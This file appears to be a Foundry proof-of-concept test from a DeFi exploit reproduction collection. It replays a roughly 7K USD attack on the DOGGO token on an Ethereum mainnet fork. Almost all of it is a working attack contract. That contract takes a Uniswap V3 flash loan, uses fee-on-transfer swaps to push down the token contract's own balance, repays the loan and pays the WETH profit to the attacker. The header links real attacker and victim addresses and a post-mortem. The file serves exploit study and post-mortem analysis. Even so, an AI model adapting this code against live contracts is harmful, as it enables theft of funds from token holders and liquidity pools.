pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 7K USD
// Attacker : https://etherscan.io/address/0x7248939f65bdd23aab9eaab1bc4a4f909567486e
// Attack Contract : https://etherscan.io/address/0xbdb0bc0941ba81672593cd8b3f9281789f2754d1
// Vulnerable Contract : https://etherscan.io/address/0x240cd7b53d364a208ed41f8ced4965d11f571b7a
// Attack Tx : https://app.blocksec.com/explorer/tx/eth/0x9e074d70e4f9022cba33c1417a6f6338d8248b67d6141c9a32913ca567d0efca?line=0

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x240cd7b53d364a208ed41f8ced4965d11f571b7a

// @Analysis
// Post-mortem : https://x.com/TenArmorAlert/status/1837358462076080521
// Twitter Guy : https://x.com/TenArmorAlert/status/1837358462076080521
// Hacking God : N/A

address constant UniswapV3Pool = 0xeA5A12A857E8302D70fcb1123D5F8f57EF7B7d0B;
address constant weth9 = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant UniswapV2Router02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
address constant DOGGO = 0x240Cd7b53d364a208eD41f8cEd4965D11F571B7a;
address constant attacker = 0x7248939f65bdd23Aab9eaaB1bc4A4F909567486e;

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 20794802);
        deal(attacker, 3.78e-16 ether);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of attacker", address(attacker).balance, 18);
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        deal(address(attC), 3.78e-16 ether);
        attC.attack{value: 3.78e-16 ether}();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of attacker", address(attacker).balance, 18);
    }
}

// 0xBdb0bc0941BA81672593Cd8B3F9281789F2754D1
contract AttackerC {
    receive() external payable {}

    function attack() public payable {
        address token0 = IUniswapV3Pool(UniswapV3Pool).token0();
        if (token0 == DOGGO) {
            bytes memory data = abi.encode(
                DOGGO,
                uint256(4206900000000000001),
                UniswapV3Pool,
                uint8(1),
                uint256(7543239134633386634),
                uint256(0)
            );
            IUniswapV3Pool(UniswapV3Pool).flash(address(this), 7543239134633386634, 0, data);

            uint256 wbal = IWETH9(weth9).balanceOf(address(this));
            if (wbal > 0) {
                IWETH9(weth9).withdraw(wbal);
                uint256 tip = (((type(uint256).max * tx.gasprice) + 2824441419115821437) / 10000) * msg.value;
                if (tip > 0) {
                    payable(block.coinbase).transfer(tip);
                }
                payable(tx.origin).transfer(address(this).balance);
            }
        }
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external payable {
        uint256 balThis = IDOGGO(DOGGO).balanceOf(address(this));
        uint256 balDoggoSelf = IDOGGO(DOGGO).balanceOf(DOGGO);

        if (balDoggoSelf < 4206900000000000001) {
            if ((4206900000000000001 - balDoggoSelf) < balThis && balThis >= 4206900000000000001) {
                uint256 amountIn = balThis + balDoggoSelf - 8413800000000000002;
                IDOGGO(DOGGO).approve(UniswapV2Router02, amountIn);
                IUniswapV2Router02(UniswapV2Router02).swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    amountIn,
                    0,
                    _path(DOGGO, weth9),
                    address(this),
                    block.timestamp + 1
                );

                uint256 doggoSelfAfter = IDOGGO(DOGGO).balanceOf(DOGGO);
                if (doggoSelfAfter < 4206900000000000001) {
                    IDOGGO(DOGGO).transfer(DOGGO, 4206900000000000002 - doggoSelfAfter);
                    uint256 balAfter = IDOGGO(DOGGO).balanceOf(address(this));
                    IDOGGO(DOGGO).approve(UniswapV2Router02, balAfter);
                    IUniswapV2Router02(UniswapV2Router02).swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        balAfter,
                        0,
                        _path(DOGGO, weth9),
                        address(this),
                        block.timestamp + 1
                    );

                    uint256 wbal = IWETH9(weth9).balanceOf(address(this));
                    IWETH9(weth9).approve(UniswapV2Router02, wbal);
                    uint256[] memory used = IUniswapV2Router02(UniswapV2Router02).swapTokensForExactTokens(
                        7618671525979720501,
                        wbal,
                        _path(weth9, DOGGO),
                        address(this),
                        block.timestamp + 1
                    );

                    if (IDOGGO(DOGGO).balanceOf(address(this)) >= 7618671525979720501) {
                        IDOGGO(DOGGO).transfer(UniswapV3Pool, 7618671525979720501);
                    }
                }
            }
        }
    }

    function _path(address a, address b) internal pure returns (address[] memory p) {
        p = new address[](2);
        p[0] = a;
        p[1] = b;
    }

    fallback() external payable {}
}

interface IUniswapV3Pool {
	function token0() external view returns (address);
	function flash(address, uint256, uint256, bytes calldata) external; 
}
interface IWETH9 {
	function withdraw(uint256) external;
	function approve(address, uint256) external returns (bool);
	function balanceOf(address) external view returns (uint256); 
}
interface IUniswapV2Router02 {
	function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256, uint256, address[] calldata, address, uint256) external;
	function swapTokensForExactTokens(uint256, uint256, address[] calldata, address, uint256) external returns (uint256[] memory); 
}
interface IDOGGO {
	function approve(address, uint256) external returns (bool);
	function transfer(address, uint256) external returns (bool);
	function balanceOf(address) external view returns (uint256); 
}